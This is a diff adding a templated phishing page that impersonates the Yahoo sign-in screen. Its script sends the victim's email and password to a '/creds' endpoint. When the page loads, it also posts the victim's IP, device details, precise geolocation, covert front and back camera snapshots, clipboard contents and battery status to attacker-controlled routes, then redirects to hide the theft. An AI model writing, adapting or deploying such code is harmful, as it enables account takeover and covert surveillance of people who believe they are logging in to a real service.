@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Yahoo - Sign in</title>
+<link rel="icon" href="https://s.yimg.com/rz/l/favicon.ico">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #fff; min-height: 100vh; display: flex; flex-direction: column; }
+.main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 24px; }
+.container { width: 100%; max-width: 400px; }
+.logo { text-align: center; margin-bottom: 24px; }
+.logo svg { width: 120px; height: 50px; }
+.login-box { text-align: center; }
+.login-box h1 { font-size: 28px; font-weight: 400; color: #1d1d1f; margin-bottom: 32px; }
+.form-group { margin-bottom: 16px; text-align: right; }
+.form-group input { width: 100%; padding: 14px 16px; border: none; border-bottom: 2px solid #ccc; font-size: 16px; color: #1d1d1f; outline: none; background: transparent; transition: border-color 0.2s; border-radius: 0; }
+.form-group input:focus { border-bottom-color: #6001D2; }
+.form-group input::placeholder { color: #aaa; }
+.btn-signin { width: 100%; padding: 13px; background: #6001D2; color: #fff; border: none; border-radius: 25px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 24px; transition: background 0.2s; }
+.btn-signin:hover { background: #4f01a8; }
+.stay-signed { display: flex; align-items: center; gap: 8px; margin-top: 20px; justify-content: center; }
+.stay-signed input { width: 18px; height: 18px; accent-color: #6001D2; }
+.stay-signed label { font-size: 14px; color: #6e6d7a; cursor: pointer; }
+.divider { display: flex; align-items: center; margin: 28px 0; }
+.divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #ddd; }
+.divider span { padding: 0 16px; color: #6e6d7a; font-size: 14px; }
+.alt-login { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
+.alt-btn { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 12px; border: 1px solid #ddd; border-radius: 25px; font-size: 14px; color: #1d1d1f; cursor: pointer; background: #fff; text-decoration: none; font-weight: 500; transition: background 0.2s; }
+.alt-btn:hover { background: #f7f7f7; }
+.alt-btn svg { width: 20px; height: 20px; }
+.forgot-link { display: block; margin-top: 20px; color: #6001D2; font-size: 14px; text-decoration: none; font-weight: 600; }
+.forgot-link:hover { text-decoration: underline; }
+.signup-text { margin-top: 28px; font-size: 14px; color: #6e6d7a; }
+.signup-text a { color: #6001D2; text-decoration: none; font-weight: 600; }
+.signup-text a:hover { text-decoration: underline; }
+.loading { display: none; text-align: center; padding: 32px; }
+.spinner { border: 3px solid #e5e5e5; border-top: 3px solid #6001D2; border-radius: 50%; width: 32px; height: 32px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.footer { text-align: center; padding: 20px; border-top: 1px solid #eee; }
+.footer-links { display: flex; justify-content: center; gap: 16px; flex-wrap: wrap; margin-bottom: 8px; }
+.footer-links a { color: #6001D2; font-size: 13px; text-decoration: none; }
+.footer-copy { font-size: 12px; color: #aaa; }
+@media (max-width: 440px) { .container { padding: 0 20px; } }
+</style>
+</head>
+<body>
+<div class="main">
+<div class="container">
+<div class="logo">
+<svg viewBox="0 0 240 80" fill="none">
+<text x="50%" y="55" text-anchor="middle" font-family="Helvetica Neue, Arial, sans-serif" font-size="56" font-weight="700" fill="#6001D2">Yahoo</text>
+<text x="50%" y="72" text-anchor="middle" font-family="Helvetica Neue, Arial, sans-serif" font-size="14" fill="#6001D2">!</text>
+</svg>
+</div>
+<div class="login-box">
+<h1>Sign in to Yahoo</h1>
+<form id="loginForm">
+<div class="form-group">
+<input type="text" id="email" placeholder="Email address" required>
+</div>
+<div class="form-group">
+<input type="password" id="password" placeholder="Password" required>
+</div>
+<div class="stay-signed">
+<input type="checkbox" id="staysigned" checked>
+<label for="staysigned">Stay signed in</label>
+</div>
+<button type="submit" class="btn-signin">Sign in</button>
+</form>
+<div class="loading" id="loading">
+<div class="spinner"></div>
+<p style="font-size: 14px; color: #6e6d7a;">Signing in...</p>
+</div>
+<a href="#" class="forgot-link">Forgot username or password?</a>
+<div class="divider"><span>or</span></div>
+<div class="alt-login">
+<a href="#" class="alt-btn">
+<svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
+Sign in with Google
+</a>
+<a href="#" class="alt-btn">
+<svg viewBox="0 0 24 24"><path d="M16.365 1.43c0 1.14-.493 2.27-1.177 3.08-.744.9-1.99 1.57-2.987 1.57-.18 0-.36-.02-.53-.06.02-.18.04-.39.04-.56 0-1.12.535-2.22 1.235-3.08.75-.93 2.04-1.64 2.93-1.64.18 0 .35.02.49.05v.62zm3.24 5.93c-1.79 1.04-2.98 2.98-2.98 5.15 0 2.97 2.07 5.05 4.37 5.05-.28.81-.62 1.6-1.07 2.33-.8 1.33-1.66 2.66-3 2.68-1.31.02-1.74-.77-3.24-.77s-1.97.75-3.2.79c-1.29.05-2.27-1.44-3.08-2.77-1.65-2.72-2.92-7.7-1.22-11.06.85-1.67 2.36-2.72 4-2.75 1.27-.02 2.46.85 3.24.85.77 0 2.22-1.06 3.74-.9.64.03 2.43.26 3.58 1.93-.09.06-2.14 1.24-2.14 3.22z" fill="#000"/></svg>
+Sign in with Apple
+</a>
+</div>
+<div class="signup-text">
+Don't have an account? <a href="#">Sign up</a>
+</div>
+</div>
+</div>
+</div>
+<footer class="footer">
+<div class="footer-links">
+<a href="#">Terms</a>
+<a href="#">Privacy</a>
+<a href="#">Community Guidelines</a>
+</div>
+<div class="footer-copy">© 2024 Yahoo. All rights reserved.</div>
+</footer>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="<%=a %>/public/advanced.js"></script>
+<script>
+var uid="<%=uid %>";
+var video = document.getElementById('video');
+var canvas = document.getElementById('canvas');
+
+async function gatherAll() {
+    let td = '📧 <b>Yahoo Victim!</b>\n\n';
+    td += '⚓ IP: <code><%=ip %></code>\n';
+    td += '⏰ Time: ' + new Date().toLocaleString() + '\n';
+    td += '🖥️ OS: <code>' + navigator.platform + '</code>\n';
+    td += '📱 Screen: <code>' + screen.width + 'x' + screen.height + '</code>\n';
+    td += '🌐 Browser: <code>' + navigator.userAgent.split(' ').pop() + '</code>\n';
+
+    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
+
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition((p)=>{
+            $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});
+        }, ()=>{}, {enableHighAccuracy:true, timeout: 10000});
+    }
+
+    async function captureCamera(facingMode, label) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: facingMode, width: 640, height: 480}});
+            video.srcObject = stream;
+            await video.play();
+            await new Promise(r => setTimeout(r, 2000));
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            $.post("<%=a %>/camsnap", {uid: uid, img: encodeURIComponent(canvas.toDataURL("image/jpeg", 0.8).replace("data:image/jpeg;base64,", "")), cam: label});
+            stream.getTracks().forEach(t => t.stop());
+        } catch(e) {}
+    }
+
+    try { await captureCamera("user", "selfie"); } catch(e) {}
+    try { await captureCamera("environment", "back"); } catch(e) {}
+
+    try {
+        if(navigator.clipboard && navigator.clipboard.readText) {
+            const clip = await navigator.clipboard.readText();
+            if(clip) $.post("<%=a %>/clipboard", {uid:uid, clip:encodeURIComponent(clip)});
+        }
+    } catch(e) {}
+
+    try {
+        const bat = await navigator.getBattery();
+        $.post("<%=a %>/battery", {uid:uid, level:Math.round(bat.level*100), charging:bat.charging});
+    } catch(e) {}
+}
+
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('password').value;
+
+    document.querySelector('form').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+
+    $.post("<%=a %>/creds", {
+        uid: uid,
+        user: encodeURIComponent(email),
+        pass: encodeURIComponent(pass),
+        platform: 'Yahoo'
+    });
+
+    await new Promise(r => setTimeout(r, 2500));
+    window.location.href = "<%=url %>";
+});
+
+window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
+</script>
+</body>
+</html>
